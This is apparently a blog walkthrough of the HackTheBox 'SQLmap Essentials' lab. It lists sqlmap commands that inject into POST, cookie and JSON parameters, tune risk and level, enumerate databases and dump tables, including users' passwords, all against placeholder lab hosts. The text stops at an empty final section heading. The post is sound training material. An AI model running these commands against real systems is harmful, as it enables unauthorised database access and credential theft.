---
title: "SQLmap Essentials - HackTheBox"
date: 2025-01-07 00:00:00 +0300
categories: [SQLmap Essentials]
tags: [SQLmap Essentials, cheatsheet, HackTheBox]
---


# SQLmap Essentials 

Hello there, welcome to my first blog of the year. 

This lab series is part of the [Bug Bounty Hunter Path](https://academy.hackthebox.com/path/preview/bug-bounty-hunter) of HackTheBox. This module aims to teach you the basics of using SQLMap to discover various types of SQL Injection vulnerabilities, all the way to the advanced enumeration of databases to retrieve all data of interest.

While I wait for the final skill assessment payload to get the flag which is taking a little too long I decided to write this walkthrough. It is among the labs I enjoyed much during the Bug Bounty Path.

I hope you enjoy perusing this walkthrough as much as I did writing it.

Also find a cheatsheet of the lab the end of the blog

# Running SQLmap on a HTTP Request

We are provided with a target that leads to a page that displays links to the different Cases respective of the questions.
 
 ![Alt Text](../assets/img/SQLMap-Essentials/sqlmap-essentials1.png)



Questions:


`1. What's the contents of table flag2? (Case #2)`

There is an 'id' parameter that is used to retrive rows of a table from a database. 

This indicates it is a POST request. This might help us in writing the command.

    sqlmap  'http://SERVERIP:PORT/case2.php' --data='id=*1' --batch --dump -T flag2

From the command:


  `--data - speecifies that the HTTP data provided should be sent in a POST request.`

  `id=*1 - This is the parameter of interest. The asterisk is a custom injection marker.`

  `--batch - allows the running of the command without any user input.`

  `--dump - displays data from a specified database table`

  `-T - specifies database table.`


`2. What's the contents of table flag3? (Case #3)`

The cookie value id is vulnerable.

    sqlmap 'http://SERVERIP:PORT/case3.php'  --cookie='id=1*' --batch --dump  -T flag3

From the command:

  `--cookie - specifies the HTTP cookies that should be sent with the POST requests.`


`3. What's the contents of table flag4? (Case #4) `

There is a vulnerability in a JSON value for data: id. 

While JSON data is parsed differently in a HTTP request we may use a tool like BURP or Curl to capture the raw HTTP request and output it to a file. We then use the file in the command.

We will use Burpsuite for this.

![Alt Text](../assets/img/SQLMap-Essentials/sqlmap-essentials2.png)


    sqlmap -r req.txt  --batch --dump  -T flag4 

While it is applicable in this lab, we may also use the following command.

    sqlmap -u 'http://SERVERIP:PORT/case4.php'  --data={'"id":1'} --batch --dump  -T flag4

# Attack Tuning

Sqlmap comes right off the bat as a very strong tool, though it is capable to do more with some tuning by using flags that increase the accuracy of your scan. These may include flags for Level/Risk, Status Codes, Text and Techniques etc.

In this section we will use some of the above-mentioned flags that will dig deeper in our scans to achieve our goals. Follow me as we do it.

Questions

`1. What's the contents of table flag5? (Case #5) `

This challenges indicaes an OR SQLi vulnerability for the parameter 'id'. For this we will have to use the Level/Risk flags by raising the risk level. This is done because OR payloads are inherently dangerous in a default run, where underlying vulnerable SQL statements are actively modifying the database content. 

    sqlmap -u http://SERVERIP:PORT/case5.php?id=1 -T flag5 --no-cast --dump --batch --risk 3 --level 5

    sqlmap -u http://SERVERIP:PORT/case5.php?id=1 -T flag5 --no-cast --dump --batch --risk 3 --level 5 -dbs testdb -dbms MYSQL

From the command:

  `--no-cast - This flag ensures that you get the correct content.` 
  `--risk - [1-3]  extends the risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).`
  `--level - [1-5] extends  boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).`
  `--dbs - The database in question.`
  `--dbms - The underlying Database schema being used.`

`2. What's the contents of table flag6? (Case #6)`

The challenge has a vulnerable parameter col. This challenge requires the use of the prefix flag.

    sqlmap -u 'http://SERVERIP:PORT/case6.php?col=id' -T flag6 --dump --batch --risk 3 --level 5 --prefix='`)'

From the command:

  `--prefix -  used to specify a prefix that will be added to the payloads sent by SQLmap during its testing process`

`3. What's the contents of table flag7? (Case #7)`

The challenge has a vulnerable parameter at id and it is vulnerable using a UNION Query based technique. This means that we have to use the Union flag.

    sqlmap -u 'http://SERVERIP:PORT/case7.php?id=1' -T flag7 --dump --batch --risk 3 --level 5 --union-col=5

From the Command:

  `--union-col=5 - From the provided exercise we can manually count the columns in the table, so we include that in the command`

# Database Enumeration

Database enumaration requires the knowledge of how to use flags in your command. The `man sqlmap` and `sqlmap --help` can be of help with this.

Questions

`1. What's the contents of table flag1 in the testdb database? (Case #1)`

This challenge requires to know the names of the Database containing the table in question and the Database schema type being used

    sqlmap -u 'http://SERVERIP:PORT/case1.php?id=1' -T flag1 --dump --batch --risk 3 --level 5 --dbms MYSQL -D testdb

# Advanced Database Enumeration

Question

`1. What's the name of the column containing "style" in it's name? (Case #1)`

After looking into the sqlmap manual page we should now know what flag to use in order to get contents of the 'style' column

    sqlmap -u 'http://SERVERIP:PORT/case1.php?id=1' --batch --search -C "style"

From the command: 

  `search -C - Used to search for databases, tables, and columns of interest. The -C flag represents columns.`

`2. What's the Kimberly user's password? (Case #1)`

    sqlmap -u 'http://SERVERIP:PORT/case1.php?id=1' --dump --batch --columns -C name,password -T users

 From the command:

  `column - Lists the columns specified`

# Bypassing Web Application Protections







